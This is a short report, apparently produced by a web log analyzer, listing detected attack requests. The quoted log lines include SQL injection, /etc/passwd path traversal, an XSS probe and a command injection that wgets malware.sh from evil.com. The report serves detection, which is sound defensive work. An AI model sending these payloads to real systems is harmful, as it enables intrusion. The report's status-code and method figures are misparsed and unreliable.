# Web Attack Log Report

Total requests: **5**

## HTTP Methods
- No methods parsed

## Status Codes
- 300: 1
- 500: 1
- 800: 1
- 700: 1
- 650: 1

## Suspicious IPs
- 10.0.0.12: 4 suspicious requests
- 103.15.22.77: 2 suspicious requests
- 192.168.4.9: 2 suspicious requests
- 192.168.1.50: 1 suspicious requests

## Detected Attacks
### Admin Enumeration
- **IP:** 192.168.1.50
  - Pattern: `/admin`
  - Request: `192.168.1.50 - - [05/May/2025:11:22:10 +0000] "GET /admin.php HTTP/1.1" 404 300`
- **IP:** 192.168.4.9
  - Pattern: `/shell`
  - Request: `192.168.4.9 - - [05/May/2025:11:22:17 +0000] "GET /shell?cmd=wget http://evil.com/malware.sh HTTP/1.1" 200 650`

### SQL Injection
- **IP:** 10.0.0.12
  - Pattern: `union`
  - Request: `10.0.0.12 - - [05/May/2025:11:22:11 +0000] "GET /index.php?id=1 union select 1,2 HTTP/1.1" 200 500`
- **IP:** 10.0.0.12
  - Pattern: `select`
  - Request: `10.0.0.12 - - [05/May/2025:11:22:11 +0000] "GET /index.php?id=1 union select 1,2 HTTP/1.1" 200 500`

### Path Traversal
- **IP:** 10.0.0.12
  - Pattern: `../`
  - Request: `10.0.0.12 - - [05/May/2025:11:22:13 +0000] "GET /?file=../../../../etc/passwd HTTP/1.1" 200 800`
- **IP:** 10.0.0.12
  - Pattern: `/etc/passwd`
  - Request: `10.0.0.12 - - [05/May/2025:11:22:13 +0000] "GET /?file=../../../../etc/passwd HTTP/1.1" 200 800`

### XSS
- **IP:** 103.15.22.77
  - Pattern: `<script`
  - Request: `103.15.22.77 - - [05/May/2025:11:22:15 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 700`
- **IP:** 103.15.22.77
  - Pattern: `alert(`
  - Request: `103.15.22.77 - - [05/May/2025:11:22:15 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 700`

### Command Injection
- **IP:** 192.168.4.9
  - Pattern: `wget `
  - Request: `192.168.4.9 - - [05/May/2025:11:22:17 +0000] "GET /shell?cmd=wget http://evil.com/malware.sh HTTP/1.1" 200 650`

